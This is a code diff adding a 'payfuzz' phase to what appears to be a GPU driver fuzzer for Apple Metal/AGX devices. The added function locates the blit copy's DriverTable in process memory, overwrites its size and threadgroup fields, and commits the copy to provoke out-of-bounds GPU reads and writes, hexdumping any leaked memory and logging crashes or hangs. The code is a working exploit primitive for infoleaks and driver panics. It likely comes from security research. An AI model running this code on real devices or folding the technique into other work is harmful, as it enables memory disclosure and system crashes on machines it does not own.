@@ -15697,6 +15697,243 @@ static void p_killrace(void) {
     LOG("[krc] survived all %ld rounds (alive)", rounds);
 }
 
+// V118: p_payfuzz — payload fuzz of the blit copy itself. docs/agx_blit_stream.md:
+// a G16 blit copy is a CDM compute dispatch of the built-in copy_buffer
+// kernel; its executable parameters live in BlitComputeDriverTable, which is
+// copied into the pool window (CPU-RW, v89 write-confirmed) and referenced
+// by the control stream via 32-bit pool offsets. Table layout (doc §2.3):
+//   +0x0c u32 threadgroups = min(size, 0x400)
+//   +0x18 u32 size | +0x38 u32 size (copy size, twice)
+//   +0x60 {srcBase, dstBase} (the pool GPUVA slots v89 patched)
+// Patching size/threadgroups HERE (not the kcmd envelope) makes the GPU copy
+// OOB past the buffers — OOB-read content lands in bufB (infoleak from
+// GPUVM), OOB writes hit the canary tail / beyond (crash/gpuEvent/panic).
+// The table is located per case (cached with validation) by its full
+// signature: gpuA qword followed by gpuB qword at +0x60 with 0x400/0x10000/
+// 0x10000 dwords at +0x0c/+0x18/+0x38. Patch is pointwise by offset — never
+// gscan_patch by the 0x10000 value (it occurs everywhere; v91 lesson).
+// Env: FUZZ_PAYFUZZ_LOCATE=1 (map-only mode), FUZZ_PAYFUZZ_SKIP=N.
+// Tag [pfl]. 2 s timeout — wedge stops the phase with a resume hint.
+static uint8_t *pfl_locate(uint64_t gpuA, uint64_t gpuB) {
+    mach_vm_address_t addr = 0;
+    while (1) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                           (vm_region_info_t)&info, &cnt, &obj)) break;
+        if ((info.protection & VM_PROT_WRITE) && sz >= 0x100 && sz <= 0x4000000) {
+            uint8_t *base = (uint8_t *)addr;
+            for (mach_vm_size_t o = 0x60; o + 0x70 <= sz; o += 8) {
+                if (*(uint64_t *)(base + o) == gpuA &&
+                    *(uint64_t *)(base + o + 8) == gpuB) {
+                    uint8_t *tb = base + o - 0x60;
+                    if (*(uint32_t *)(tb + 0x0c) == 0x400 &&
+                        *(uint32_t *)(tb + 0x18) == 0x10000 &&
+                        *(uint32_t *)(tb + 0x38) == 0x10000)
+                        return tb;   // full DriverTable signature
+                }
+            }
+        }
+        addr += sz;
+        if (!sz) break;
+    }
+    return NULL;
+}
+// locate-only mode: log a map of every region carrying signature pieces
+static void pfl_locate_dump(uint64_t gpuA, uint64_t gpuB) {
+    LOG("[pfl] LOCATE mode: scanning writable VM for DriverTable signatures");
+    LOG("[pfl] signature: +0x0c u32 0x400 (tg) | +0x18/+0x38 u32 0x10000 | +0x60 {gpuA,gpuB}");
+    mach_vm_address_t addr = 0;
+    long nreg = 0, ngpuA = 0, nmatch = 0;
+    while (1) {
+        mach_vm_size_t sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj;
+        if (mach_vm_region(mach_task_self(), &addr, &sz, VM_REGION_BASIC_INFO_64,
+                           (vm_region_info_t)&info, &cnt, &obj)) break;
+        if ((info.protection & VM_PROT_WRITE) && sz >= 0x100 && sz <= 0x4000000) {
+            uint8_t *base = (uint8_t *)addr;
+            long shown = 0;
+            for (mach_vm_size_t o = 0x60; o + 0x70 <= sz && shown < 8; o += 8) {
+                if (*(uint64_t *)(base + o) == gpuA) {
+                    uint8_t *tb = base + o - 0x60;
+                    int match = (*(uint32_t *)(tb + 0x0c) == 0x400 &&
+                                 *(uint32_t *)(tb + 0x18) == 0x10000 &&
+                                 *(uint32_t *)(tb + 0x38) == 0x10000);
+                    LOG("[pfl] region %llx sz 0x%llx: gpuA @+0x%llx gpuB-next %d "
+                        "tg 0x%x s18 0x%x s38 0x%x%s", (uint64_t)addr, (uint64_t)sz,
+                        (uint64_t)o, *(uint64_t *)(base + o + 8) == gpuB ? 1 : 0,
+                        *(uint32_t *)(tb + 0x0c), *(uint32_t *)(tb + 0x18),
+                        *(uint32_t *)(tb + 0x38), match ? " *** MATCH ***" : "");
+                    if (match) nmatch++;
+                    ngpuA++;
+                    shown++;
+                }
+            }
+            if (shown) nreg++;
+        }
+        addr += sz;
+        if (!sz) break;
+    }
+    LOG("[pfl] locate done: %ld regions, %ld gpuA hits, %ld full matches",
+        nreg, ngpuA, nmatch);
+}
+static void p_payfuzz(void) {
+    int locate_only = getenv("FUZZ_PAYFUZZ_LOCATE") != NULL;
+    long skip = atol(getenv("FUZZ_PAYFUZZ_SKIP") ?: "0");
+    LOG("[pfl] v118 blit DriverTable payload fuzz (locate %d, skip %ld)",
+        locate_only, skip);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    if (!dev) { LOG("[pfl] no device"); return; }
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    id<MTLBuffer> bufA = [dev newBufferWithLength:0x14000 options:MTLResourceStorageModeShared];
+    id<MTLBuffer> bufB = [dev newBufferWithLength:0x14000 options:MTLResourceStorageModeShared];
+    if (!mq || !bufA || !bufB) { LOG("[pfl] alloc fail"); return; }
+    uint8_t *ap = (uint8_t *)[bufA contents];
+    uint8_t *bp = (uint8_t *)[bufB contents];
+    memset(ap, 0x41, 0x10000);
+    memset(ap + 0x10000, 0x42, 0x4000);
+    memset(bp, 0x00, 0x10000);
+    memset(bp + 0x10000, 0xCC, 0x4000);
+    uint64_t gpuA = [bufA gpuAddress];
+    uint64_t gpuB = [bufB gpuAddress];
+    g_srcx = gpuA ^ 0x5a5a5a5a5a5a5a5aULL;   // xor-masked slot-patcher targets
+    g_dstx = gpuB ^ 0x5a5a5a5a5a5a5a5aULL;
+    LOG("[pfl] gpuA 0x%llx gpuB 0x%llx", gpuA, gpuB);
+
+    // reference encode (never committed in locate mode)
+    id<MTLCommandBuffer> rcb = [mq commandBuffer];
+    id<MTLBlitCommandEncoder> renc = [rcb blitCommandEncoder];
+    [renc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+    [renc endEncoding];
+    if (locate_only) {
+        pfl_locate_dump(gpuA, gpuB);
+        LOG("[pfl] locate-only done (alive)");
+        return;
+    }
+
+    // mutation plan (deterministic): size@+0x18, size@+0x38, both sizes,
+    // threadgroups@+0x0c, combos (bigger size + bigger tg)
+    static const uint32_t svals[] = { 0x20000, 0x100000, 0x1000000,
+                                      0x10000000, 0x80000000, 0xffffffff };
+    static const uint32_t tgvals[] = { 0, 1, 0x400, 0x1000, 0x10000, 0xffffffff };
+    static const uint32_t csvals[] = { 0x20000, 0x100000, 0xffffffff };
+    static const uint32_t ctg[] = { 0x1000, 0x10000 };
+    LOG("[pfl] plan: 6+6+6+6+6 = 30 cases");
+
+    __block long cn = 0, done = 0;
+    __block int stop = 0;
+    __block uint8_t *cached = NULL;   // validated per case
+    void (^runcase)(int, uint32_t, uint32_t, const char *) =
+    ^(int field, uint32_t newv, uint32_t newv2, const char *desc) {
+        if (stop) return;
+        cn++;
+        if (cn <= skip) return;
+        done++;
+        id<MTLCommandBuffer> cb = [mq commandBuffer];
+        id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+        [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufB destinationOffset:0 size:0x10000];
+        [enc endEncoding];
+        // locate (cached + validated): the fresh encode must have rewritten
+        // the table with the baseline values
+        uint8_t *tb = cached;
+        if (!tb || *(uint64_t *)(tb + 0x60) != gpuA ||
+            *(uint32_t *)(tb + 0x18) != 0x10000 || *(uint32_t *)(tb + 0x0c) != 0x400) {
+            tb = pfl_locate(gpuA, gpuB);
+            cached = tb;
+        }
+        if (!tb) {
+            LOG("[pfl] case #%ld: no DriverTable in VM, stopping", cn);
+            stop = 1;
+            return;
+        }
+        uint32_t oldv = 0, oldv2 = 0;
+        if (field == 0 || field == 1) {           // one size field
+            oldv = *(uint32_t *)(tb + (field == 0 ? 0x18 : 0x38));
+            *(uint32_t *)(tb + (field == 0 ? 0x18 : 0x38)) = newv;
+        } else if (field == 2) {                  // both size fields
+            oldv = *(uint32_t *)(tb + 0x18);
+            oldv2 = *(uint32_t *)(tb + 0x38);
+            *(uint32_t *)(tb + 0x18) = newv;
+            *(uint32_t *)(tb + 0x38) = newv2;
+        } else if (field == 3) {                  // threadgroups
+            oldv = *(uint32_t *)(tb + 0x0c);
+            *(uint32_t *)(tb + 0x0c) = newv;
+        } else {                                   // combo: size + tg
+            oldv = *(uint32_t *)(tb + 0x18);
+            oldv2 = *(uint32_t *)(tb + 0x0c);
+            *(uint32_t *)(tb + 0x18) = newv;
+            *(uint32_t *)(tb + 0x38) = newv;
+            *(uint32_t *)(tb + 0x0c) = newv2;
+        }
+        LOG("[pfl] case #%ld %s old 0x%x/0x%x -> new 0x%x/0x%x commit",
+            cn, desc, oldv, oldv2, newv, newv2);
+        fsync(fileno(stderr));
+        @try {
+            [cb commit];
+        } @catch (NSException *ex) {
+            LOG("[pfl] case #%ld commit EXCEPTION %s", cn, [[ex name] UTF8String]);
+            memset(bp, 0x00, 0x10000); memset(bp + 0x10000, 0xCC, 0x4000);
+            return;
+        }
+        long cst = -1;
+        for (int w = 0; w < 200; w++) {
+            cst = (long)[cb status];
+            if (cst >= 4) break;   // Completed=4 / Error=5
+            usleep((useconds_t)10000);
+        }
+        if (cst < 4) {
+            LOG("[pfl] [HIT] case #%ld TIMEOUT status %ld — GPU wedged? stop "
+                "(resume: FUZZ_PAYFUZZ_SKIP=%ld)", cn, cst, cn);
+            stop = 1;
+            return;
+        }
+        NSError *cberr = [cb error];   // via intermediate var (v86 lesson)
+        long a41 = 0, nz = 0, bad = 0;
+        for (long i = 0; i < 0x10000; i++) { if (bp[i] == 0x41) a41++; if (bp[i]) nz++; }
+        for (long i = 0x10000; i < 0x14000; i++) if (bp[i] != 0xCC) bad++;
+        // leak dump: first byte deviating from the expected copy — either
+        // OOB-read source content inside 0x10000, or a canary hit beyond it
+        long leakoff = -1;
+        for (long i = 0; i < 0x10000; i++) if (bp[i] != 0x41) { leakoff = i; break; }
+        if (leakoff < 0)
+            for (long i = 0x10000; i < 0x14000; i++) if (bp[i] != 0xCC) { leakoff = i; break; }
+        int hit = (cst != 4) || cberr != nil || bad > 0 || (leakoff >= 0 && leakoff < 0x10000);
+        if (cberr) {
+            NSString *ed = [cberr description];
+            LOG("[pfl] case #%ld -> status %ld err '%s' | B 41 %ld nz %ld canary-bad %ld [HIT]",
+                cn, cst, [ed UTF8String], a41, nz, bad);
+        } else {
+            LOG("[pfl] case #%ld -> status %ld | B 41 %ld nz %ld canary-bad %ld%s",
+                cn, cst, a41, nz, bad, hit ? " [HIT]" : "");
+        }
+        if (leakoff >= 0) {
+            LOG("[pfl] case #%ld leak @0x%lx (expect 41 below 0x10000, CC above):",
+                cn, leakoff);
+            hexdump("pfl-leak", bp + leakoff, 64);
+        }
+        memset(bp, 0x00, 0x10000);
+        memset(bp + 0x10000, 0xCC, 0x4000);
+    };
+
+    for (unsigned i = 0; i < sizeof(svals)/sizeof(svals[0]) && !stop; i++)
+        runcase(0, svals[i], 0, "size@+0x18");
+    for (unsigned i = 0; i < sizeof(svals)/sizeof(svals[0]) && !stop; i++)
+        runcase(1, svals[i], 0, "size@+0x38");
+    for (unsigned i = 0; i < sizeof(svals)/sizeof(svals[0]) && !stop; i++)
+        runcase(2, svals[i], svals[i], "size@both");
+    for (unsigned i = 0; i < sizeof(tgvals)/sizeof(tgvals[0]) && !stop; i++)
+        runcase(3, tgvals[i], 0, "threadgroups@+0x0c");
+    for (unsigned i = 0; i < sizeof(csvals)/sizeof(csvals[0]) && !stop; i++)
+        for (unsigned j = 0; j < sizeof(ctg)/sizeof(ctg[0]) && !stop; j++)
+            runcase(4, csvals[i], ctg[j], "combo size+tg");
+    LOG("[pfl] done: total cases %ld executed %ld (alive)%s",
+        cn, done, stop ? " STOPPED-EARLY" : "");
+}
+
 // V92: pinned-GPUAddress resources (new_resource format B with pinned fields).
 // variant 0 = task spec: +0x30 u64 pinned addr, +0x38 u64 size (base fields as
 // in the traced plain alloc); variant 1 = the pinned record from the macOS
@@ -20435,6 +20672,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_MTLMUT")) { p_mtlmut(); LOG("[probe13] mtlmut-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLMUTC")) { p_mtlmutc(); LOG("[probe13] mtlmutc-only mode, stop"); return NULL; }
         if (getenv("FUZZ_KILLRACE")) { p_killrace(); LOG("[probe13] killrace-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_PAYFUZZ") || getenv("FUZZ_PAYFUZZ_LOCATE")) { p_payfuzz(); LOG("[probe13] payfuzz-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLTRACE")) { p_mtltrace(); LOG("[probe13] mtltrace-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CONNPROBE")) { p_connprobe(); LOG("[probe13] connprobe-only mode, stop"); return NULL; }
         if (getenv("FUZZ_MTLSELF")) { p_mtlself(); LOG("[probe13] mtlself-only mode, stop"); return NULL; }
